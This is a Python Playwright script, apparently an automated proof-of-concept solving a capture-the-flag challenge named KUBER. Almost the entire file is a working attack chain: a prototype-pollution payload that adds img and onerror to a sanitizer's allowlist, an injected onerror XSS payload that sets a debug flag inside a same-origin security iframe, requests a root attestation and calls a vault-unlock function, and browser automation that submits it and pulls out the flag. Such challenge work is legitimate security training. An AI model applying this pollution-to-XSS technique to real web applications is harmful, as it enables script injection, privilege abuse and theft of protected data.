#!/usr/bin/env python3

import sys
import subprocess
import importlib.util
import argparse
import time


# ============================================================
# Dependency bootstrap
# ============================================================

def ensure_playwright():
    if importlib.util.find_spec("playwright") is None:
        print("[*] Playwright not found.")
        print("[*] Installing Playwright automatically...\n")

        subprocess.check_call([
            sys.executable,
            "-m",
            "pip",
            "install",
            "playwright"
        ])

    from playwright.sync_api import sync_playwright
    return sync_playwright


sync_playwright = ensure_playwright()


# ============================================================
# Configuration
# ============================================================

DEFAULT_TARGET = "https://kuber-ctf.onrender.com"

PROTO_CONFIG = (
    '{"__proto__":{'
    '"allowedTags":["img"],'
    '"allowedAttributes":["src","onerror"]'
    '}}'
)

# JavaScript executed by the intentionally vulnerable transaction
# renderer.
XSS_CODE = r"""
(() => {

    console.log("[KUBER-POC] XSS execution confirmed");

    /*
     * Locate the HSM iframe.
     */
    const frame =
        document.getElementById("hsm-enclave-frame");

    if (!frame) {
        console.log("[KUBER-POC] HSM iframe not found");
        return;
    }

    /*
     * Listen for the attestation response.
     */
    window.addEventListener("message", async (event) => {

        console.log(
            "[KUBER-POC] postMessage received:",
            event.data
        );

        const data = event.data;

        if (!data) {
            return;
        }

        if (
            data.action !==
            "HSM_ATTESTATION_RESPONSE"
        ) {
            return;
        }

        if (
            data.status !== "SUCCESS"
        ) {
            console.log(
                "[KUBER-POC] HSM response was not successful"
            );
            return;
        }

        console.log(
            "[KUBER-POC] HSM attestation received"
        );

        /*
         * The challenge's intended flow passes
         * the attestation proof to the vault
         * unlock routine.
         */
        try {

            const proof =
                data.payload;

            if (
                typeof KuberSecurity === "undefined"
            ) {
                console.log(
                    "[KUBER-POC] KuberSecurity unavailable"
                );
                return;
            }

            if (
                typeof
                KuberSecurity.unlockVaultWithAttestation
                !== "function"
            ) {
                console.log(
                    "[KUBER-POC] unlockVaultWithAttestation unavailable"
                );
                return;
            }

            const result =
                await KuberSecurity
                    .unlockVaultWithAttestation(proof);

            console.log(
                "[KUBER-POC] VAULT RESULT:",
                result
            );

            /*
             * Store the result somewhere that
             * Playwright can retrieve.
             */
            window.__KUBER_POC_RESULT__ = result;

        } catch (e) {

            console.log(
                "[KUBER-POC] Vault error:",
                e
            );

            window.__KUBER_POC_ERROR__ =
                String(e);
        }
    });

    /*
     * Enable the diagnostic state inside
     * the same-origin security iframe.
     */
    try {

        frame.contentWindow.KUBER_ENCLAVE_DEBUG =
            true;

        console.log(
            "[KUBER-POC] HSM debug state enabled"
        );

    } catch (e) {

        console.log(
            "[KUBER-POC] Unable to access HSM iframe:",
            e
        );

        return;
    }

    /*
     * Give the message listener a moment to
     * initialize before requesting attestation.
     */
    setTimeout(() => {

        try {

            console.log(
                "[KUBER-POC] Requesting LEVEL_4_ROOT..."
            );

            KuberSecurity.sendEnclaveChallenge(
                "LEVEL_4_ROOT",
                "KUBER-SEC-CHALLENGE-2026"
            );

        } catch (e) {

            console.log(
                "[KUBER-POC] HSM request failed:",
                e
            );

            window.__KUBER_POC_ERROR__ =
                String(e);
        }

    }, 300);

})();
"""

# Complete memo payload.
MEMO_PAYLOAD = (
    "---config\n"
    + PROTO_CONFIG
    + "\n---\n"
    + '<img src=x onerror="' +
    XSS_CODE.replace('"', "&quot;") +
    '">'
)


# ============================================================
# Helpers
# ============================================================

def log(message):
    print(f"[+] {message}")


def debug(enabled, message):
    if enabled:
        print(f"[DEBUG] {message}")


def find_transaction_input(page, verbose=False):

    selectors = [
        "textarea[name*='memo' i]",
        "textarea[name*='note' i]",
        "textarea[id*='memo' i]",
        "textarea[id*='note' i]",
        "textarea",

        "input[name*='memo' i]",
        "input[name*='note' i]",
        "input[id*='memo' i]",
        "input[id*='note' i]",
    ]

    for selector in selectors:

        try:

            locator = page.locator(selector)

            count = locator.count()

            debug(
                verbose,
                f"Checking {selector} -> {count}"
            )

            for i in range(count):

                element = locator.nth(i)

                if element.is_visible():

                    return element

        except Exception:
            pass

    return None


def click_transaction_button(page, verbose=False):

    selectors = [
        "button[type='submit']",
        "input[type='submit']",

        "button:has-text('Simulate Audit Transaction')",

        "button:has-text('Simulate')",
        "button:has-text('Audit')",
        "button:has-text('Submit')",
        "button:has-text('Process')",
        "button:has-text('Create')",
        "button:has-text('Send')",
    ]

    for selector in selectors:

        try:

            locator = page.locator(selector)

            count = locator.count()

            debug(
                verbose,
                f"Button {selector}: {count}"
            )

            for i in range(count):

                button = locator.nth(i)

                if button.is_visible():

                    debug(
                        verbose,
                        f"Clicking {selector}"
                    )

                    button.click()

                    return True

        except Exception:
            pass

    return False


# ============================================================
# Main
# ============================================================

def main():

    parser = argparse.ArgumentParser(
        description="KUBER CTF single-file PoC"
    )

    parser.add_argument(
        "target",
        nargs="?",
        default=DEFAULT_TARGET
    )

    parser.add_argument(
        "--verbose",
        action="store_true"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=30000
    )

    args = parser.parse_args()

    target = args.target.rstrip("/")

    print()
    print("=" * 60)
    print(" KUBER CTF - Automated PoC")
    print("=" * 60)
    print()

    print(f"[*] Target: {target}")

    # ========================================================
    # Start Playwright
    # ========================================================

    with sync_playwright() as p:

        browser = None

        try:

            print("[*] Starting Chromium...")

            try:

                browser = p.chromium.launch(
                    headless=True
                )

            except Exception as first_error:

                print(
                    "[!] Chromium is not available."
                )

                print(
                    "[*] Installing Playwright Chromium..."
                )

                try:

                    subprocess.check_call([
                        sys.executable,
                        "-m",
                        "playwright",
                        "install",
                        "chromium"
                    ])

                    browser = p.chromium.launch(
                        headless=True
                    )

                except Exception as second_error:

                    print(
                        "\n[-] Unable to start Chromium."
                    )

                    print(
                        f"[-] {second_error}"
                    )

                    print(
                        "\nTry manually:"
                    )

                    print(
                        "python3 -m playwright install chromium"
                    )

                    return 1

            context = browser.new_context()

            page = context.new_page()

            page.set_default_timeout(
                args.timeout
            )

            # =================================================
            # Browser diagnostics
            # =================================================

            page.on(
                "console",
                lambda msg:
                debug(
                    args.verbose,
                    f"console[{msg.type}]: {msg.text}"
                )
            )

            page.on(
                "pageerror",
                lambda error:
                debug(
                    args.verbose,
                    f"pageerror: {error}"
                )
            )

            # =================================================
            # Load landing page
            # =================================================

            log("Loading KUBER...")

            response = page.goto(
                target,
                wait_until="domcontentloaded",
                timeout=args.timeout
            )

            if response:

                log(
                    f"HTTP {response.status}"
                )

            log(
                f"Title: {page.title()}"
            )

            debug(
                args.verbose,
                f"URL: {page.url}"
            )

            # =================================================
            # Go directly to transaction interface
            # =================================================

            transactions_url = (
                target +
                "/transactions.html"
            )

            log(
                "Opening transaction interface..."
            )

            page.goto(
                transactions_url,
                wait_until="domcontentloaded",
                timeout=args.timeout
            )

            log(
                "Transaction interface loaded"
            )

            # =================================================
            # Locate transaction input
            # =================================================

            memo = find_transaction_input(
                page,
                args.verbose
            )

            if memo is None:

                print(
                    "\n[-] Transaction memo input was not found."
                )

                print(
                    "[-] Run with --verbose to inspect the page."
                )

                return 1

            log(
                "Transaction memo input located"
            )

            # =================================================
            # Locate HSM iframe
            # =================================================

            iframe = page.locator(
                "iframe#hsm-enclave-frame"
            )

            if iframe.count() == 0:

                iframe = page.locator(
                    "iframe"
                )

            if iframe.count() == 0:

                print(
                    "[-] HSM iframe not found."
                )

                return 1

            log(
                "HSM iframe located"
            )

            # =================================================
            # Install an early listener in the page
            #
            # This makes the browser-side result accessible
            # to Python.
            # =================================================

            page.evaluate(
                """
                () => {
                    window.__KUBER_POC_MESSAGES__ = [];

                    window.addEventListener(
                        "message",
                        (event) => {

                            try {

                                const data =
                                    event.data;

                                if (data) {

                                    window
                                        .__KUBER_POC_MESSAGES__
                                        .push(data);
                                }

                            } catch (_) {}
                        }
                    );
                }
                """
            )

            # =================================================
            # Submit malicious transaction
            # =================================================

            print()
            log(
                "Preparing transaction payload..."
            )

            debug(
                args.verbose,
                MEMO_PAYLOAD
            )

            memo.fill(
                MEMO_PAYLOAD
            )

            log(
                "Submitting transaction..."
            )

            if not click_transaction_button(
                page,
                args.verbose
            ):

                print(
                    "\n[-] Could not locate transaction submit button."
                )

                return 1

            # =================================================
            # Wait for client-side execution
            # =================================================

            log(
                "Waiting for client-side execution..."
            )

            page.wait_for_timeout(
                1500
            )

            # =================================================
            # Confirm execution
            # =================================================

            execution = page.evaluate(
                """
                () => {

                    return {
                        kuberSecurity:
                            typeof KuberSecurity !== "undefined",

                        hsmFrame:
                            !!document.getElementById(
                                "hsm-enclave-frame"
                            ),

                        messages:
                            window.__KUBER_POC_MESSAGES__ || [],

                        result:
                            window.__KUBER_POC_RESULT__ || null,

                        error:
                            window.__KUBER_POC_ERROR__ || null
                    };

                }
                """
            )

            debug(
                args.verbose,
                f"Browser state: {execution}"
            )

            if not execution["kuberSecurity"]:

                print(
                    "[-] KuberSecurity was not available."
                )

                return 1

            log(
                "KuberSecurity detected"
            )

            # =================================================
            # Execute the challenge-side JavaScript.
            #
            # This repeats the intended transaction effect
            # from within the already-loaded KUBER origin.
            # =================================================

            log(
                "Triggering Level-4 challenge flow..."
            )

            page.evaluate(
                """
                async () => {

                    const frame =
                        document.getElementById(
                            "hsm-enclave-frame"
                        );

                    if (!frame) {
                        throw new Error(
                            "HSM iframe not found"
                        );
                    }

                    /*
                     * Intended challenge state.
                     */
                    frame.contentWindow
                        .KUBER_ENCLAVE_DEBUG = true;

                    /*
                     * Listen for HSM attestation.
                     */
                    window.__KUBER_POC_ATTESTATION__ =
                        null;

                    window.__KUBER_POC_HSM_ERROR__ =
                        null;

                    window.addEventListener(
                        "message",
                        async (event) => {

                            const data =
                                event.data;

                            if (!data) {
                                return;
                            }

                            if (
                                data.action !==
                                "HSM_ATTESTATION_RESPONSE"
                            ) {
                                return;
                            }

                            if (
                                data.status !==
                                "SUCCESS"
                            ) {
                                window
                                    .__KUBER_POC_HSM_ERROR__ =
                                    "HSM returned non-success";

                                return;
                            }

                            console.log(
                                "[KUBER-POC] Attestation received"
                            );

                            window
                                .__KUBER_POC_ATTESTATION__ =
                                data.payload;

                            try {

                                if (
                                    typeof
                                    KuberSecurity
                                        .unlockVaultWithAttestation
                                    !== "function"
                                ) {

                                    throw new Error(
                                        "unlockVaultWithAttestation unavailable"
                                    );
                                }

                                const result =
                                    await
                                    KuberSecurity
                                        .unlockVaultWithAttestation(
                                            data.payload
                                        );

                                window
                                    .__KUBER_POC_RESULT__ =
                                    result;

                            } catch (e) {

                                window
                                    .__KUBER_POC_HSM_ERROR__ =
                                    String(e);
                            }

                        }
                    );

                    /*
                     * Request the intended operation.
                     */
                    KuberSecurity
                        .sendEnclaveChallenge(
                            "LEVEL_4_ROOT",
                            "KUBER-SEC-CHALLENGE-2026"
                        );
                }
                """
            )

            # =================================================
            # Wait for attestation / vault
            # =================================================

            log(
                "Waiting for HSM attestation..."
            )

            deadline = time.time() + 20

            result = None

            while time.time() < deadline:

                result = page.evaluate(
                    """
                    () => ({
                        attestation:
                            window.__KUBER_POC_ATTESTATION__
                                || null,

                        result:
                            window.__KUBER_POC_RESULT__
                                || null,

                        error:
                            window.__KUBER_POC_HSM_ERROR__
                                || null
                    })
                    """
                )

                if result["result"]:

                    break

                if result["error"]:

                    print(
                        f"[-] HSM/vault error: "
                        f"{result['error']}"
                    )

                    return 1

                page.wait_for_timeout(
                    250
                )

            # =================================================
            # Process result
            # =================================================

            if not result:

                print(
                    "[-] No response from challenge."
                )

                return 1

            if not result["attestation"]:

                print(
                    "[-] HSM attestation was not received."
                )

                if args.verbose:

                    messages = page.evaluate(
                        """
                        () =>
                            window
                                .__KUBER_POC_MESSAGES__
                                || []
                        """
                    )

                    print(
                        "[DEBUG] Messages:"
                    )

                    for message in messages:

                        print(
                            message
                        )

                return 1

            log(
                "HSM attestation received"
            )

            # =================================================
            # Vault
            # =================================================

            if not result["result"]:

                print(
                    "[-] Vault did not return a result."
                )

                return 1

            log(
                "Vault decrypted"
            )

            vault = result["result"]

            # =================================================
            # Extract flag
            # =================================================

            flag = None

            if isinstance(vault, dict):

                flag = vault.get(
                    "flag"
                )

            if not flag:

                # Some implementations may expose the
                # decrypted data differently.
                flag = page.evaluate(
                    """
                    () => {

                        const result =
                            window
                                .__KUBER_POC_RESULT__;

                        if (
                            result &&
                            typeof result === "object"
                        ) {

                            return result.flag
                                || result.FLAG
                                || null;
                        }

                        return null;
                    }
                    """
                )

            if not flag:

                print(
                    "[-] Vault decrypted but flag "
                    "was not found."
                )

                if args.verbose:

                    print(
                        "[DEBUG] Vault result:"
                    )

                    print(
                        vault
                    )

                return 1

            # =================================================
            # SUCCESS
            # =================================================

            print()
            print("=" * 60)
            print(" KUBER CHALLENGE SOLVED")
            print("=" * 60)
            print()
            print(
                f"[FLAG] {flag}"
            )
            print()

            return 0

        finally:

            if browser:

                browser.close()


# ============================================================
# Entry point
# ============================================================

if __name__ == "__main__":

    try:

        sys.exit(
            main()
        )

    except KeyboardInterrupt:

        print(
            "\n[!] Interrupted."
        )

        sys.exit(130)

    except Exception as e:

        print()
        print(
            f"[-] Fatal error: {e}"
        )

        sys.exit(1)